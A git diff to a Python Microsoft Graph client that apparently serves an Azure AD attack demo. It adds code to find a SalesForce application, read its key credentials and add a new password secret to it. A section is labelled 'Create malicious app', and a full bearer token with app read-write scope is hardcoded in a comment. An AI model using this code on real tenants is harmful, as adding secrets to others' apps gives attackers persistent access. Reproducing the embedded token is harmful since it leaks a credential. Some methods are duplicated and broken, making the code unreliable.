@@ -83,11 +83,11 @@ class Graph:
         # self.ensure_graph_for_app_only_auth()
 
         endpoint = '/applications'
-        # Only request specific properties
-        select = 'displayName,mail,userPrincipalName'
-        request_url = f'{endpoint}'
+
+        search = "displayName:SalesForce"
+        request_url = f'{endpoint}?$search="{search}"'
         print(request_url)
-        list_response = self.user_client.get(request_url)
+        list_response = self.user_client.get(request_url, headers={'ConsistencyLevel': 'eventual'})
         return list_response.json()
 
     def get_servicePrincipals(self):
@@ -115,7 +115,26 @@ class Graph:
        # endpoint = '/applications'
         endpoint = '/servicePrincipals'
         # Only request specific properties
-        search = 'displayName:MS Graph Applications'
+        search = 'displayName:Sales'
+        request_url = f'{endpoint}?$search="{search}"&$count=true ' \
+
+
+        found_app = self.user_client.get(request_url , headers={'ConsistencyLevel': 'eventual'})
+
+
+
+        return found_app.json()
+
+    def get_app(self):
+        # INSERT YOUR CODE HERE
+        # Note: if using app_client, be sure to call
+        # ensure_graph_for_app_only_auth before using it
+        # self.ensure_graph_for_app_only_auth()
+
+       # endpoint = '/applications'
+        endpoint = '/servicePrincipals'
+        # Only request specific properties
+        search = 'displayName:Sales'
         request_url = f'{endpoint}?$search="{search}"&$count=true ' \
 
 
@@ -126,8 +145,12 @@ class Graph:
         return found_app.json()
 
 
+
     def enable_app(self,to_enable,token):
-        id = "2942ffee-ad11-458b-95a9-242e361aafa4"
+        #salesforce app id
+        id = "232b2e58-7e6e-4567-bef0-eff5a2bd5b73"
+        # id id = "ab220987-a982-4b6a-9c3b-f07f233f4bf8"
+        #id = "2942ffee-ad11-458b-95a9-242e361aafa4"
         #id = '53857935-7373-49af-b209-497f13dc8493'
         request_url = f'/servicePrincipals/{id}'
        # token = 'eyJ0eXAiOiJKV1QiLCJub25jZSI6ImdlNFNNMWg2MHh0RmwzSDFfTmplZFlwb3g2RXYtX09IOGlLbzRZNHJYTDAiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGxWMFRPSSIsImtpZCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGxWMFRPSSJ9.eyJhdWQiOiIwMDAwMDAwMy0wMDAwLTAwMDAtYzAwMC0wMDAwMDAwMDAwMDAiLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8xNDczOTIyYS1mODJiLTRlNGUtYWE1NS0zM2QxNjE5NTE5ODIvIiwiaWF0IjoxNjU3MDI1Njk5LCJuYmYiOjE2NTcwMjU2OTksImV4cCI6MTY1NzExMjM5OSwiYWNjdCI6MCwiYWNyIjoiMSIsImFpbyI6IkUyWmdZTmo2OFVXT0pIK01DcHUvaWJwbTIrYXFwUjkrWEhWbzNiVmRpdStFUUxMUnI2c0EiLCJhbXIiOlsicHdkIl0sImFwcF9kaXNwbGF5bmFtZSI6Ik1hbEFwcCIsImFwcGlkIjoiYTc1MjVmYzUtYzdkMy00OWY2LTk0NDktNTBmYzIxMjZmNjg5IiwiYXBwaWRhY3IiOiIwIiwiaWR0eXAiOiJ1c2VyIiwiaXBhZGRyIjoiOTMuMTcyLjIwNS4xMTAiLCJuYW1lIjoiRHdpZ2h0IFNjaHJ1dGUiLCJvaWQiOiJmMDcxODgwZS03ODg3LTQ2NTEtYjMxZS1iNDBiNWNiZDY2YmQiLCJwbGF0ZiI6IjE0IiwicHVpZCI6IjEwMDMyMDAxQkFEQjVGREUiLCJyaCI6IjAuQVlFQUtwSnpGQ3Y0VGs2cVZUUFJZWlVaZ2dNQUFBQUFBQUFBd0FBQUFBQUFBQUNCQUVVLiIsInNjcCI6IkFwcGxpY2F0aW9uLlJlYWRXcml0ZS5BbGwgb3BlbmlkIHByb2ZpbGUgVXNlci5SZWFkIGVtYWlsIiwic2lnbmluX3N0YXRlIjpbImttc2kiXSwic3ViIjoid0s0Z0tJUkVDWXJ6TV9TSDhxUV82aHJvamIxcW5qT05RdkhPMWs0VmtQNCIsInRlbmFudF9yZWdpb25fc2NvcGUiOiJFVSIsInRpZCI6IjE0NzM5MjJhLWY4MmItNGU0ZS1hYTU1LTMzZDE2MTk1MTk4MiIsInVuaXF1ZV9uYW1lIjoiZ2FkaUByaWRnZWRlbW9jb20ub25taWNyb3NvZnQuY29tIiwidXBuIjoiZ2FkaUByaWRnZWRlbW9jb20ub25taWNyb3NvZnQuY29tIiwidXRpIjoiejljV3F2cER0RVNQVkJCeDF4ZEZBUSIsInZlciI6IjEuMCIsIndpZHMiOlsiNjJlOTAzOTQtNjlmNS00MjM3LTkxOTAtMDEyMTc3MTQ1ZTEwIiwiYjc5ZmJmNGQtM2VmOS00Njg5LTgxNDMtNzZiMTk0ZTg1NTA5Il0sInhtc19jYyI6WyJDUDEiXSwieG1zX3NzbSI6IjEiLCJ4bXNfc3QiOnsic3ViIjoiNVJTdlVZSjZUODdSWmJ1RGR3aHg1d1VDWDg5SFQ5ZGdiclh2RGJkUW5mayJ9LCJ4bXNfdGNkdCI6MTYxNzE0OTY2OX0.WdtWISkDLAwPnJWdb_eB_-UEku9NrzWlpkRXHjdfs0I-kjmQ7nbswt7zzAceD9TFmO8biWtIarQzOFqPUKMRN445C-uNIGQCV-Vubybtjny2TAio_oTkChPP5JQAT_TJlpT0Q_GzjB_kcThjoUl2KkpkG589j5hp6T0d3elYgfMmSqQHRNFTrJp511_GJhkIRz4EshVTOamVtFVCCZGC4xqozNefftP6oIye63hCv-oPL8d2IgQfe_ENjMIQ_OblJg3O_09hVc89OHZYQaok6fnc-uChTt3LjgSQQWBXpeFyz6ZPRvPtr1f8BcS0_RGvTELXfW3ox1brUl172wZWCw'
@@ -149,3 +172,48 @@ class Graph:
                                                      ,'Content-Type': 'application/json'})
         print(enabled_app)
         return enabled_app
+
+
+    def get_app_keys(self):
+        # salesforce app id from seearch
+        id = "460a567d-f226-4836-b929-0a4a83427177"
+
+
+        request_url = f'/applications/{id}?$select=keyCredentials'
+        print(request_url)
+        keys = self.user_client.get(request_url, headers={'ConsistencyLevel': 'eventual'})
+        print(keys)
+        return keys.json()
+
+    def add_password(self, token):
+        # salesforce app id from seearch
+        id ="460a567d-f226-4836-b929-0a4a83427177"
+        #id = "232b2e58-7e6e-4567-bef0-eff5a2bd5b73"
+        # sales force service principal id = "ab220987-a982-4b6a-9c3b-f07f233f4bf8"
+        # id = "2942ffee-ad11-458b-95a9-242e361aafa4"
+        # id = '53857935-7373-49af-b209-497f13dc8493'
+        request_url = f'/applications/{id}/addPassword'
+
+
+        body = {'displayName': 'my token'}
+
+        print(request_url)
+        print(body)
+        print({'Authorization': f'Bearer {token}'
+                  , 'Content-Type': 'application/json'})
+        added_password = self.user_client.post(request_url,
+                                             data=json.dumps(body),
+                                             headers={'Authorization': f'Bearer {token}'
+                                                 , 'Content-Type': 'application/json'})
+        print(added_password)
+        return added_password.json()
+
+
+
+    ####   Create malicious app
+    def get_app_keys(self):
+        request_url = f'/applications/{id}?$select=keyCredentials'
+        print(request_url)
+        keys = self.user_client.get(request_url, headers={'ConsistencyLevel': 'eventual'})
+        print(keys)
+        return keys.json()
